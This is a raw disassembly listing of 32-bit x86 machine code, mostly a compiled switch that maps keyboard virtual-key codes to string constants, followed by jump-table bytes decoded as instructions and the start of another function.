  404910:	8d 45 ed             	lea    -0x13(%ebp),%eax
  404913:	83 ec 10             	sub    $0x10,%esp
  404916:	8b cc                	mov    %esp,%ecx
  404918:	e9 dc 01 00 00       	jmp    0x404af9
  40491d:	53                   	push   %ebx
  40491e:	8d 45 ee             	lea    -0x12(%ebp),%eax
  404921:	83 ec 10             	sub    $0x10,%esp
  404924:	8b cc                	mov    %esp,%ecx
  404926:	e9 1e 01 00 00       	jmp    0x404a49
  40492b:	53                   	push   %ebx
  40492c:	8d 45 ef             	lea    -0x11(%ebp),%eax
  40492f:	83 ec 10             	sub    $0x10,%esp
  404932:	8b cc                	mov    %esp,%ecx
  404934:	50                   	push   %eax
  404935:	68 b4 08 41 00       	push   $0x4108b4
  40493a:	e9 c2 02 00 00       	jmp    0x404c01
  40493f:	b8 c0 00 00 00       	mov    $0xc0,%eax
  404944:	3b c8                	cmp    %eax,%ecx
  404946:	0f 87 80 00 00 00    	ja     0x4049cc
  40494c:	74 6a                	je     0x4049b8
  40494e:	81 e9 bb 00 00 00    	sub    $0xbb,%ecx
  404954:	74 54                	je     0x4049aa
  404956:	49                   	dec    %ecx
  404957:	74 3d                	je     0x404996
  404959:	49                   	dec    %ecx
  40495a:	74 2c                	je     0x404988
  40495c:	49                   	dec    %ecx
  40495d:	74 1b                	je     0x40497a
  40495f:	49                   	dec    %ecx
  404960:	0f 85 a8 02 00 00    	jne    0x404c0e
  404966:	53                   	push   %ebx
  404967:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40496a:	83 ec 10             	sub    $0x10,%esp
  40496d:	8b cc                	mov    %esp,%ecx
  40496f:	50                   	push   %eax
  404970:	68 b0 08 41 00       	push   $0x4108b0
  404975:	e9 87 02 00 00       	jmp    0x404c01
  40497a:	53                   	push   %ebx
  40497b:	8d 45 f1             	lea    -0xf(%ebp),%eax
  40497e:	83 ec 10             	sub    $0x10,%esp
  404981:	8b cc                	mov    %esp,%ecx
  404983:	e9 85 01 00 00       	jmp    0x404b0d
  404988:	53                   	push   %ebx
  404989:	8d 45 f2             	lea    -0xe(%ebp),%eax
  40498c:	83 ec 10             	sub    $0x10,%esp
  40498f:	8b cc                	mov    %esp,%ecx
  404991:	e9 da 01 00 00       	jmp    0x404b70
  404996:	53                   	push   %ebx
  404997:	8d 45 f3             	lea    -0xd(%ebp),%eax
  40499a:	83 ec 10             	sub    $0x10,%esp
  40499d:	8b cc                	mov    %esp,%ecx
  40499f:	50                   	push   %eax
  4049a0:	68 ac 08 41 00       	push   $0x4108ac
  4049a5:	e9 57 02 00 00       	jmp    0x404c01
  4049aa:	53                   	push   %ebx
  4049ab:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4049ae:	83 ec 10             	sub    $0x10,%esp
  4049b1:	8b cc                	mov    %esp,%ecx
  4049b3:	e9 31 01 00 00       	jmp    0x404ae9
  4049b8:	53                   	push   %ebx
  4049b9:	8d 45 f5             	lea    -0xb(%ebp),%eax
  4049bc:	83 ec 10             	sub    $0x10,%esp
  4049bf:	8b cc                	mov    %esp,%ecx
  4049c1:	50                   	push   %eax
  4049c2:	68 a8 08 41 00       	push   $0x4108a8
  4049c7:	e9 35 02 00 00       	jmp    0x404c01
  4049cc:	81 e9 db 00 00 00    	sub    $0xdb,%ecx
  4049d2:	74 3d                	je     0x404a11
  4049d4:	49                   	dec    %ecx
  4049d5:	74 2c                	je     0x404a03
  4049d7:	49                   	dec    %ecx
  4049d8:	74 1b                	je     0x4049f5
  4049da:	49                   	dec    %ecx
  4049db:	0f 85 2d 02 00 00    	jne    0x404c0e
  4049e1:	53                   	push   %ebx
  4049e2:	8d 45 f6             	lea    -0xa(%ebp),%eax
  4049e5:	83 ec 10             	sub    $0x10,%esp
  4049e8:	8b cc                	mov    %esp,%ecx
  4049ea:	50                   	push   %eax
  4049eb:	68 a4 08 41 00       	push   $0x4108a4
  4049f0:	e9 0c 02 00 00       	jmp    0x404c01
  4049f5:	53                   	push   %ebx
  4049f6:	8d 45 f7             	lea    -0x9(%ebp),%eax
  4049f9:	83 ec 10             	sub    $0x10,%esp
  4049fc:	8b cc                	mov    %esp,%ecx
  4049fe:	e9 be 00 00 00       	jmp    0x404ac1
  404a03:	53                   	push   %ebx
  404a04:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404a07:	83 ec 10             	sub    $0x10,%esp
  404a0a:	8b cc                	mov    %esp,%ecx
  404a0c:	e9 d9 01 00 00       	jmp    0x404bea
  404a11:	53                   	push   %ebx
  404a12:	8d 45 f9             	lea    -0x7(%ebp),%eax
  404a15:	83 ec 10             	sub    $0x10,%esp
  404a18:	8b cc                	mov    %esp,%ecx
  404a1a:	e9 29 01 00 00       	jmp    0x404b48
  404a1f:	3b c8                	cmp    %eax,%ecx
  404a21:	0f 87 f1 00 00 00    	ja     0x404b18
  404a27:	0f 84 d7 00 00 00    	je     0x404b04
  404a2d:	8d 41 d0             	lea    -0x30(%ecx),%eax
  404a30:	83 f8 09             	cmp    $0x9,%eax
  404a33:	0f 87 d5 01 00 00    	ja     0x404c0e
  404a39:	ff 24 85 37 4e 40 00 	jmp    *0x404e37(,%eax,4)
  404a40:	53                   	push   %ebx
  404a41:	8d 45 e5             	lea    -0x1b(%ebp),%eax
  404a44:	83 ec 10             	sub    $0x10,%esp
  404a47:	8b cc                	mov    %esp,%ecx
  404a49:	50                   	push   %eax
  404a4a:	68 a0 08 41 00       	push   $0x4108a0
  404a4f:	e9 ad 01 00 00       	jmp    0x404c01
  404a54:	53                   	push   %ebx
  404a55:	8d 45 e6             	lea    -0x1a(%ebp),%eax
  404a58:	83 ec 10             	sub    $0x10,%esp
  404a5b:	8b cc                	mov    %esp,%ecx
  404a5d:	50                   	push   %eax
  404a5e:	68 9c 08 41 00       	push   $0x41089c
  404a63:	e9 99 01 00 00       	jmp    0x404c01
  404a68:	53                   	push   %ebx
  404a69:	8d 45 e7             	lea    -0x19(%ebp),%eax
  404a6c:	83 ec 10             	sub    $0x10,%esp
  404a6f:	8b cc                	mov    %esp,%ecx
  404a71:	50                   	push   %eax
  404a72:	68 98 08 41 00       	push   $0x410898
  404a77:	e9 85 01 00 00       	jmp    0x404c01
  404a7c:	53                   	push   %ebx
  404a7d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404a80:	83 ec 10             	sub    $0x10,%esp
  404a83:	8b cc                	mov    %esp,%ecx
  404a85:	50                   	push   %eax
  404a86:	68 94 08 41 00       	push   $0x410894
  404a8b:	e9 71 01 00 00       	jmp    0x404c01
  404a90:	53                   	push   %ebx
  404a91:	8d 45 e9             	lea    -0x17(%ebp),%eax
  404a94:	83 ec 10             	sub    $0x10,%esp
  404a97:	8b cc                	mov    %esp,%ecx
  404a99:	50                   	push   %eax
  404a9a:	68 90 08 41 00       	push   $0x410890
  404a9f:	e9 5d 01 00 00       	jmp    0x404c01
  404aa4:	53                   	push   %ebx
  404aa5:	8d 45 ea             	lea    -0x16(%ebp),%eax
  404aa8:	83 ec 10             	sub    $0x10,%esp
  404aab:	8b cc                	mov    %esp,%ecx
  404aad:	50                   	push   %eax
  404aae:	68 8c 08 41 00       	push   $0x41088c
  404ab3:	e9 49 01 00 00       	jmp    0x404c01
  404ab8:	53                   	push   %ebx
  404ab9:	8d 45 eb             	lea    -0x15(%ebp),%eax
  404abc:	83 ec 10             	sub    $0x10,%esp
  404abf:	8b cc                	mov    %esp,%ecx
  404ac1:	50                   	push   %eax
  404ac2:	68 88 08 41 00       	push   $0x410888
  404ac7:	e9 35 01 00 00       	jmp    0x404c01
  404acc:	53                   	push   %ebx
  404acd:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404ad0:	83 ec 10             	sub    $0x10,%esp
  404ad3:	8b cc                	mov    %esp,%ecx
  404ad5:	50                   	push   %eax
  404ad6:	68 84 08 41 00       	push   $0x410884
  404adb:	e9 21 01 00 00       	jmp    0x404c01
  404ae0:	53                   	push   %ebx
  404ae1:	8d 45 ed             	lea    -0x13(%ebp),%eax
  404ae4:	83 ec 10             	sub    $0x10,%esp
  404ae7:	8b cc                	mov    %esp,%ecx
  404ae9:	50                   	push   %eax
  404aea:	57                   	push   %edi
  404aeb:	e9 11 01 00 00       	jmp    0x404c01
  404af0:	53                   	push   %ebx
  404af1:	8d 45 ee             	lea    -0x12(%ebp),%eax
  404af4:	83 ec 10             	sub    $0x10,%esp
  404af7:	8b cc                	mov    %esp,%ecx
  404af9:	50                   	push   %eax
  404afa:	68 80 08 41 00       	push   $0x410880
  404aff:	e9 fd 00 00 00       	jmp    0x404c01
  404b04:	53                   	push   %ebx
  404b05:	8d 45 ef             	lea    -0x11(%ebp),%eax
  404b08:	83 ec 10             	sub    $0x10,%esp
  404b0b:	8b cc                	mov    %esp,%ecx
  404b0d:	50                   	push   %eax
  404b0e:	68 7c 08 41 00       	push   $0x41087c
  404b13:	e9 e9 00 00 00       	jmp    0x404c01
  404b18:	b8 c0 00 00 00       	mov    $0xc0,%eax
  404b1d:	3b c8                	cmp    %eax,%ecx
  404b1f:	0f 87 89 00 00 00    	ja     0x404bae
  404b25:	74 76                	je     0x404b9d
  404b27:	81 e9 bb 00 00 00    	sub    $0xbb,%ecx
  404b2d:	74 5d                	je     0x404b8c
  404b2f:	49                   	dec    %ecx
  404b30:	74 49                	je     0x404b7b
  404b32:	49                   	dec    %ecx
  404b33:	74 32                	je     0x404b67
  404b35:	49                   	dec    %ecx
  404b36:	74 1b                	je     0x404b53
  404b38:	49                   	dec    %ecx
  404b39:	0f 85 cf 00 00 00    	jne    0x404c0e
  404b3f:	53                   	push   %ebx
  404b40:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404b43:	83 ec 10             	sub    $0x10,%esp
  404b46:	8b cc                	mov    %esp,%ecx
  404b48:	50                   	push   %eax
  404b49:	68 78 08 41 00       	push   $0x410878
  404b4e:	e9 ae 00 00 00       	jmp    0x404c01
  404b53:	53                   	push   %ebx
  404b54:	8d 45 f1             	lea    -0xf(%ebp),%eax
  404b57:	83 ec 10             	sub    $0x10,%esp
  404b5a:	8b cc                	mov    %esp,%ecx
  404b5c:	50                   	push   %eax
  404b5d:	68 74 08 41 00       	push   $0x410874
  404b62:	e9 9a 00 00 00       	jmp    0x404c01
  404b67:	53                   	push   %ebx
  404b68:	8d 45 f2             	lea    -0xe(%ebp),%eax
  404b6b:	83 ec 10             	sub    $0x10,%esp
  404b6e:	8b cc                	mov    %esp,%ecx
  404b70:	50                   	push   %eax
  404b71:	68 70 08 41 00       	push   $0x410870
  404b76:	e9 86 00 00 00       	jmp    0x404c01
  404b7b:	53                   	push   %ebx
  404b7c:	8d 45 f3             	lea    -0xd(%ebp),%eax
  404b7f:	83 ec 10             	sub    $0x10,%esp
  404b82:	8b cc                	mov    %esp,%ecx
  404b84:	50                   	push   %eax
  404b85:	68 6c 08 41 00       	push   $0x41086c
  404b8a:	eb 75                	jmp    0x404c01
  404b8c:	53                   	push   %ebx
  404b8d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404b90:	83 ec 10             	sub    $0x10,%esp
  404b93:	8b cc                	mov    %esp,%ecx
  404b95:	50                   	push   %eax
  404b96:	68 68 08 41 00       	push   $0x410868
  404b9b:	eb 64                	jmp    0x404c01
  404b9d:	53                   	push   %ebx
  404b9e:	8d 45 f5             	lea    -0xb(%ebp),%eax
  404ba1:	83 ec 10             	sub    $0x10,%esp
  404ba4:	8b cc                	mov    %esp,%ecx
  404ba6:	50                   	push   %eax
  404ba7:	68 64 08 41 00       	push   $0x410864
  404bac:	eb 53                	jmp    0x404c01
  404bae:	81 e9 db 00 00 00    	sub    $0xdb,%ecx
  404bb4:	74 3c                	je     0x404bf2
  404bb6:	49                   	dec    %ecx
  404bb7:	74 28                	je     0x404be1
  404bb9:	49                   	dec    %ecx
  404bba:	74 14                	je     0x404bd0
  404bbc:	49                   	dec    %ecx
  404bbd:	75 4f                	jne    0x404c0e
  404bbf:	53                   	push   %ebx
  404bc0:	8d 45 f6             	lea    -0xa(%ebp),%eax
  404bc3:	83 ec 10             	sub    $0x10,%esp
  404bc6:	8b cc                	mov    %esp,%ecx
  404bc8:	50                   	push   %eax
  404bc9:	68 60 08 41 00       	push   $0x410860
  404bce:	eb 31                	jmp    0x404c01
  404bd0:	53                   	push   %ebx
  404bd1:	8d 45 f7             	lea    -0x9(%ebp),%eax
  404bd4:	83 ec 10             	sub    $0x10,%esp
  404bd7:	8b cc                	mov    %esp,%ecx
  404bd9:	50                   	push   %eax
  404bda:	68 5c 08 41 00       	push   $0x41085c
  404bdf:	eb 20                	jmp    0x404c01
  404be1:	53                   	push   %ebx
  404be2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404be5:	83 ec 10             	sub    $0x10,%esp
  404be8:	8b cc                	mov    %esp,%ecx
  404bea:	50                   	push   %eax
  404beb:	68 58 08 41 00       	push   $0x410858
  404bf0:	eb 0f                	jmp    0x404c01
  404bf2:	53                   	push   %ebx
  404bf3:	8d 45 f9             	lea    -0x7(%ebp),%eax
  404bf6:	83 ec 10             	sub    $0x10,%esp
  404bf9:	8b cc                	mov    %esp,%ecx
  404bfb:	50                   	push   %eax
  404bfc:	68 54 08 41 00       	push   $0x410854
  404c01:	ff 15 4c 02 41 00    	call   *0x41024c
  404c07:	8b ce                	mov    %esi,%ecx
  404c09:	e8 8c ee ff ff       	call   0x403a9a
  404c0e:	8b 46 3c             	mov    0x3c(%esi),%eax
  404c11:	83 f8 66             	cmp    $0x66,%eax
  404c14:	0f 87 c4 00 00 00    	ja     0x404cde
  404c1a:	0f 84 ad 00 00 00    	je     0x404ccd
  404c20:	83 e8 2e             	sub    $0x2e,%eax
  404c23:	0f 84 90 00 00 00    	je     0x404cb9
  404c29:	83 e8 32             	sub    $0x32,%eax
  404c2c:	74 77                	je     0x404ca5
  404c2e:	48                   	dec    %eax
  404c2f:	74 60                	je     0x404c91
  404c31:	48                   	dec    %eax
  404c32:	74 49                	je     0x404c7d
  404c34:	48                   	dec    %eax
  404c35:	74 32                	je     0x404c69
  404c37:	48                   	dec    %eax
  404c38:	74 1b                	je     0x404c55
  404c3a:	48                   	dec    %eax
  404c3b:	0f 85 1f 01 00 00    	jne    0x404d60
  404c41:	53                   	push   %ebx
  404c42:	8d 45 e5             	lea    -0x1b(%ebp),%eax
  404c45:	83 ec 10             	sub    $0x10,%esp
  404c48:	8b cc                	mov    %esp,%ecx
  404c4a:	50                   	push   %eax
  404c4b:	68 50 08 41 00       	push   $0x410850
  404c50:	e9 fe 00 00 00       	jmp    0x404d53
  404c55:	53                   	push   %ebx
  404c56:	8d 45 e6             	lea    -0x1a(%ebp),%eax
  404c59:	83 ec 10             	sub    $0x10,%esp
  404c5c:	8b cc                	mov    %esp,%ecx
  404c5e:	50                   	push   %eax
  404c5f:	68 4c 08 41 00       	push   $0x41084c
  404c64:	e9 ea 00 00 00       	jmp    0x404d53
  404c69:	53                   	push   %ebx
  404c6a:	8d 45 e7             	lea    -0x19(%ebp),%eax
  404c6d:	83 ec 10             	sub    $0x10,%esp
  404c70:	8b cc                	mov    %esp,%ecx
  404c72:	50                   	push   %eax
  404c73:	68 48 08 41 00       	push   $0x410848
  404c78:	e9 d6 00 00 00       	jmp    0x404d53
  404c7d:	53                   	push   %ebx
  404c7e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404c81:	83 ec 10             	sub    $0x10,%esp
  404c84:	8b cc                	mov    %esp,%ecx
  404c86:	50                   	push   %eax
  404c87:	68 5c 05 41 00       	push   $0x41055c
  404c8c:	e9 c2 00 00 00       	jmp    0x404d53
  404c91:	53                   	push   %ebx
  404c92:	8d 45 e9             	lea    -0x17(%ebp),%eax
  404c95:	83 ec 10             	sub    $0x10,%esp
  404c98:	8b cc                	mov    %esp,%ecx
  404c9a:	50                   	push   %eax
  404c9b:	68 60 05 41 00       	push   $0x410560
  404ca0:	e9 ae 00 00 00       	jmp    0x404d53
  404ca5:	53                   	push   %ebx
  404ca6:	8d 45 ea             	lea    -0x16(%ebp),%eax
  404ca9:	83 ec 10             	sub    $0x10,%esp
  404cac:	8b cc                	mov    %esp,%ecx
  404cae:	50                   	push   %eax
  404caf:	68 44 08 41 00       	push   $0x410844
  404cb4:	e9 9a 00 00 00       	jmp    0x404d53
  404cb9:	53                   	push   %ebx
  404cba:	8d 45 eb             	lea    -0x15(%ebp),%eax
  404cbd:	83 ec 10             	sub    $0x10,%esp
  404cc0:	8b cc                	mov    %esp,%ecx
  404cc2:	50                   	push   %eax
  404cc3:	68 d8 08 41 00       	push   $0x4108d8
  404cc8:	e9 86 00 00 00       	jmp    0x404d53
  404ccd:	53                   	push   %ebx
  404cce:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404cd1:	83 ec 10             	sub    $0x10,%esp
  404cd4:	8b cc                	mov    %esp,%ecx
  404cd6:	50                   	push   %eax
  404cd7:	68 40 08 41 00       	push   $0x410840
  404cdc:	eb 75                	jmp    0x404d53
  404cde:	83 e8 67             	sub    $0x67,%eax
  404ce1:	74 61                	je     0x404d44
  404ce3:	48                   	dec    %eax
  404ce4:	74 4d                	je     0x404d33
  404ce6:	48                   	dec    %eax
  404ce7:	74 39                	je     0x404d22
  404ce9:	48                   	dec    %eax
  404cea:	74 29                	je     0x404d15
  404cec:	48                   	dec    %eax
  404ced:	74 15                	je     0x404d04
  404cef:	48                   	dec    %eax
  404cf0:	48                   	dec    %eax
  404cf1:	75 6d                	jne    0x404d60
  404cf3:	53                   	push   %ebx
  404cf4:	8d 45 ed             	lea    -0x13(%ebp),%eax
  404cf7:	83 ec 10             	sub    $0x10,%esp
  404cfa:	8b cc                	mov    %esp,%ecx
  404cfc:	50                   	push   %eax
  404cfd:	68 dc 08 41 00       	push   $0x4108dc
  404d02:	eb 4f                	jmp    0x404d53
  404d04:	53                   	push   %ebx
  404d05:	8d 45 ee             	lea    -0x12(%ebp),%eax
  404d08:	83 ec 10             	sub    $0x10,%esp
  404d0b:	8b cc                	mov    %esp,%ecx
  404d0d:	50                   	push   %eax
  404d0e:	68 68 08 41 00       	push   $0x410868
  404d13:	eb 3e                	jmp    0x404d53
  404d15:	53                   	push   %ebx
  404d16:	8d 45 ef             	lea    -0x11(%ebp),%eax
  404d19:	83 ec 10             	sub    $0x10,%esp
  404d1c:	8b cc                	mov    %esp,%ecx
  404d1e:	50                   	push   %eax
  404d1f:	57                   	push   %edi
  404d20:	eb 31                	jmp    0x404d53
  404d22:	53                   	push   %ebx
  404d23:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404d26:	83 ec 10             	sub    $0x10,%esp
  404d29:	8b cc                	mov    %esp,%ecx
  404d2b:	50                   	push   %eax
  404d2c:	68 3c 08 41 00       	push   $0x41083c
  404d31:	eb 20                	jmp    0x404d53
  404d33:	53                   	push   %ebx
  404d34:	8d 45 f1             	lea    -0xf(%ebp),%eax
  404d37:	83 ec 10             	sub    $0x10,%esp
  404d3a:	8b cc                	mov    %esp,%ecx
  404d3c:	50                   	push   %eax
  404d3d:	68 38 08 41 00       	push   $0x410838
  404d42:	eb 0f                	jmp    0x404d53
  404d44:	53                   	push   %ebx
  404d45:	8d 45 f2             	lea    -0xe(%ebp),%eax
  404d48:	83 ec 10             	sub    $0x10,%esp
  404d4b:	8b cc                	mov    %esp,%ecx
  404d4d:	50                   	push   %eax
  404d4e:	68 34 08 41 00       	push   $0x410834
  404d53:	ff 15 4c 02 41 00    	call   *0x41024c
  404d59:	8b ce                	mov    %esi,%ecx
  404d5b:	e8 3a ed ff ff       	call   0x403a9a
  404d60:	5f                   	pop    %edi
  404d61:	5e                   	pop    %esi
  404d62:	5b                   	pop    %ebx
  404d63:	c9                   	leave
  404d64:	c3                   	ret
  404d65:	bc 46 40 00 d0       	mov    $0xd0004046,%esp
  404d6a:	46                   	inc    %esi
  404d6b:	40                   	inc    %eax
  404d6c:	00 de                	add    %bl,%dh
  404d6e:	46                   	inc    %esi
  404d6f:	40                   	inc    %eax
  404d70:	00 ec                	add    %ch,%ah
  404d72:	46                   	inc    %esi
  404d73:	40                   	inc    %eax
  404d74:	00 fa                	add    %bh,%dl
  404d76:	46                   	inc    %esi
  404d77:	40                   	inc    %eax
  404d78:	00 08                	add    %cl,(%eax)
  404d7a:	47                   	inc    %edi
  404d7b:	40                   	inc    %eax
  404d7c:	00 1c 47             	add    %bl,(%edi,%eax,2)
  404d7f:	40                   	inc    %eax
  404d80:	00 30                	add    %dh,(%eax)
  404d82:	47                   	inc    %edi
  404d83:	40                   	inc    %eax
  404d84:	00 3e                	add    %bh,(%esi)
  404d86:	47                   	inc    %edi
  404d87:	40                   	inc    %eax
  404d88:	00 4c 47 40          	add    %cl,0x40(%edi,%eax,2)
  404d8c:	00 60 47             	add    %ah,0x47(%eax)
  404d8f:	40                   	inc    %eax
  404d90:	00 0e                	add    %cl,(%esi)
  404d92:	4c                   	dec    %esp
  404d93:	40                   	inc    %eax
  404d94:	00 00                	add    %al,(%eax)
  404d96:	01 02                	add    %eax,(%edx)
  404d98:	03 04 05 06 0b 0b 0b 	add    0xb0b0b06(,%eax,1),%eax
  404d9f:	0b 0b                	or     (%ebx),%ecx
  404da1:	0b 0b                	or     (%ebx),%ecx
  404da3:	0b 0b                	or     (%ebx),%ecx
  404da5:	0b 0b                	or     (%ebx),%ecx
  404da7:	0b 0b                	or     (%ebx),%ecx
  404da9:	0b 0b                	or     (%ebx),%ecx
  404dab:	0b 0b                	or     (%ebx),%ecx
  404dad:	0b 0b                	or     (%ebx),%ecx
  404daf:	0b 0b                	or     (%ebx),%ecx
  404db1:	0b 0b                	or     (%ebx),%ecx
  404db3:	0b 0b                	or     (%ebx),%ecx
  404db5:	0b 07                	or     (%edi),%eax
  404db7:	08 09                	or     %cl,(%ecx)
  404db9:	0a 90 47 40 00 9e    	or     -0x61ffbfb9(%eax),%dl
  404dbf:	47                   	inc    %edi
  404dc0:	40                   	inc    %eax
  404dc1:	00 ac 47 40 00 c0 47 	add    %ch,0x47c00040(%edi,%eax,2)
  404dc8:	40                   	inc    %eax
  404dc9:	00 d4                	add    %dl,%ah
  404dcb:	47                   	inc    %edi
  404dcc:	40                   	inc    %eax
  404dcd:	00 e8                	add    %ch,%al
  404dcf:	47                   	inc    %edi
  404dd0:	40                   	inc    %eax
  404dd1:	00 f6                	add    %dh,%dh
  404dd3:	47                   	inc    %edi
  404dd4:	40                   	inc    %eax
  404dd5:	00 0a                	add    %cl,(%edx)
  404dd7:	48                   	dec    %eax
  404dd8:	40                   	inc    %eax
  404dd9:	00 1e                	add    %bl,(%esi)
  404ddb:	48                   	dec    %eax
  404ddc:	40                   	inc    %eax
  404ddd:	00 32                	add    %dh,(%edx)
  404ddf:	48                   	dec    %eax
  404de0:	40                   	inc    %eax
  404de1:	00 46 48             	add    %al,0x48(%esi)
  404de4:	40                   	inc    %eax
  404de5:	00 0e                	add    %cl,(%esi)
  404de7:	4c                   	dec    %esp
  404de8:	40                   	inc    %eax
  404de9:	00 00                	add    %al,(%eax)
  404deb:	01 02                	add    %eax,(%edx)
  404ded:	03 04 05 06 0b 0b 0b 	add    0xb0b0b06(,%eax,1),%eax
  404df4:	0b 0b                	or     (%ebx),%ecx
  404df6:	0b 0b                	or     (%ebx),%ecx
  404df8:	0b 0b                	or     (%ebx),%ecx
  404dfa:	0b 0b                	or     (%ebx),%ecx
  404dfc:	0b 0b                	or     (%ebx),%ecx
  404dfe:	0b 0b                	or     (%ebx),%ecx
  404e00:	0b 0b                	or     (%ebx),%ecx
  404e02:	0b 0b                	or     (%ebx),%ecx
  404e04:	0b 0b                	or     (%ebx),%ecx
  404e06:	0b 0b                	or     (%ebx),%ecx
  404e08:	0b 0b                	or     (%ebx),%ecx
  404e0a:	0b 07                	or     (%edi),%eax
  404e0c:	08 09                	or     %cl,(%ecx)
  404e0e:	0a 8d 48 40 00 a1    	or     -0x5effbfb8(%ebp),%cl
  404e14:	48                   	dec    %eax
  404e15:	40                   	inc    %eax
  404e16:	00 af 48 40 00 bd    	add    %ch,-0x42ffbfb8(%edi)
  404e1c:	48                   	dec    %eax
  404e1d:	40                   	inc    %eax
  404e1e:	00 d1                	add    %dl,%cl
  404e20:	48                   	dec    %eax
  404e21:	40                   	inc    %eax
  404e22:	00 df                	add    %bl,%bh
  404e24:	48                   	dec    %eax
  404e25:	40                   	inc    %eax
  404e26:	00 ed                	add    %ch,%ch
  404e28:	48                   	dec    %eax
  404e29:	40                   	inc    %eax
  404e2a:	00 fb                	add    %bh,%bl
  404e2c:	48                   	dec    %eax
  404e2d:	40                   	inc    %eax
  404e2e:	00 0f                	add    %cl,(%edi)
  404e30:	49                   	dec    %ecx
  404e31:	40                   	inc    %eax
  404e32:	00 1d 49 40 00 40    	add    %bl,0x40004049
  404e38:	4a                   	dec    %edx
  404e39:	40                   	inc    %eax
  404e3a:	00 54 4a 40          	add    %dl,0x40(%edx,%ecx,2)
  404e3e:	00 68 4a             	add    %ch,0x4a(%eax)
  404e41:	40                   	inc    %eax
  404e42:	00 7c 4a 40          	add    %bh,0x40(%edx,%ecx,2)
  404e46:	00 90 4a 40 00 a4    	add    %dl,-0x5bffbfb6(%eax)
  404e4c:	4a                   	dec    %edx
  404e4d:	40                   	inc    %eax
  404e4e:	00 b8 4a 40 00 cc    	add    %bh,-0x33ffbfb6(%eax)
  404e54:	4a                   	dec    %edx
  404e55:	40                   	inc    %eax
  404e56:	00 e0                	add    %ah,%al
  404e58:	4a                   	dec    %edx
  404e59:	40                   	inc    %eax
  404e5a:	00 f0                	add    %dh,%al
  404e5c:	4a                   	dec    %edx
  404e5d:	40                   	inc    %eax
  404e5e:	00 55 8b             	add    %dl,-0x75(%ebp)
  404e61:	ec                   	in     (%dx),%al
  404e62:	83 ec 54             	sub    $0x54,%esp
  404e65:	53                   	push   %ebx
  404e66:	56                   	push   %esi
  404e67:	8b f1                	mov    %ecx,%esi
  404e69:	57                   	push   %edi
  404e6a:	80 7e 2e 01          	cmpb   $0x1,0x2e(%esi)
  404e6e:	0f 85 c1 00 00 00    	jne    0x404f35
  404e74:	83 7e 3c 56          	cmpl   $0x56,0x3c(%esi)
  404e78:	6a 00                	push   $0x0
  404e7a:	74 73                	je     0x404eef
  404e7c:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404e7f:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404e82:	50                   	push   %eax
  404e83:	68 c8 08 41 00       	push   $0x4108c8
  404e88:	ff 15 4c 02 41 00    	call   *0x41024c
  404e8e:	83 ec 10             	sub    $0x10,%esp
  404e91:	8b fc                	mov    %esp,%edi
  404e93:	50                   	push   %eax
  404e94:	ff 76 3c             	push   0x3c(%esi)
  404e97:	ff 15 68 03 41 00    	call   *0x410368
  404e9d:	59                   	pop    %ecx
  404e9e:	50                   	push   %eax
  404e9f:	8d 45 fd             	lea    -0x3(%ebp),%eax
  404ea2:	50                   	push   %eax
  404ea3:	68 58 0a 41 00       	push   $0x410a58
  404ea8:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404eab:	ff 15 4c 02 41 00    	call   *0x41024c
  404eb1:	50                   	push   %eax
  404eb2:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404eb5:	50                   	push   %eax
  404eb6:	e8 6b ad 00 00       	call   0x40fc26
  404ebb:	83 c4 0c             	add    $0xc,%esp
  404ebe:	50                   	push   %eax
  404ebf:	57                   	push   %edi
  404ec0:	e8 4f ad 00 00       	call   0x40fc14
  404ec5:	83 c4 0c             	add    $0xc,%esp
  404ec8:	8b ce                	mov    %esi,%ecx
  404eca:	e8 cb eb ff ff       	call   0x403a9a
  404ecf:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  404ed2:	ff 15 54 02 41 00    	call   *0x410254
  404ed8:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404edb:	ff 15 54 02 41 00    	call   *0x410254
  404ee1:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404ee4:	ff 15 54 02 41 00    	call   *0x410254
  404eea:	e9 ea 00 00 00       	jmp    0x404fd9
  404eef:	83 ec 10             	sub    $0x10,%esp
  404ef2:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404ef5:	8b fc                	mov    %esp,%edi
  404ef7:	8b ce                	mov    %esi,%ecx
  404ef9:	68 3c 0a 41 00       	push   $0x410a3c
  404efe:	50                   	push   %eax
  404eff:	e8 f8 01 00 00       	call   0x4050fc
  404f04:	50                   	push   %eax
  404f05:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404f08:	68 fc 09 41 00       	push   $0x4109fc
  404f0d:	50                   	push   %eax
  404f0e:	e8 07 ad 00 00       	call   0x40fc1a
  404f13:	83 c4 0c             	add    $0xc,%esp
  404f16:	50                   	push   %eax
  404f17:	57                   	push   %edi
  404f18:	e8 03 ad 00 00       	call   0x40fc20
  404f1d:	83 c4 0c             	add    $0xc,%esp
  404f20:	8b ce                	mov    %esi,%ecx
  404f22:	e8 73 eb ff ff       	call   0x403a9a
  404f27:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  404f2a:	ff 15 54 02 41 00    	call   *0x410254
  404f30:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404f33:	eb af                	jmp    0x404ee4
  404f35:	33 db                	xor    %ebx,%ebx
  404f37:	38 5e 2c             	cmp    %bl,0x2c(%esi)
  404f3a:	88 5d ff             	mov    %bl,-0x1(%ebp)
  404f3d:	75 44                	jne    0x404f83
  404f3f:	38 5e 2d             	cmp    %bl,0x2d(%esi)
  404f42:	75 18                	jne    0x404f5c
  404f44:	ff 76 3c             	push   0x3c(%esi)
  404f47:	ff 15 6c 03 41 00    	call   *0x41036c
  404f4d:	59                   	pop    %ecx
  404f4e:	88 45 ff             	mov    %al,-0x1(%ebp)
  404f51:	53                   	push   %ebx
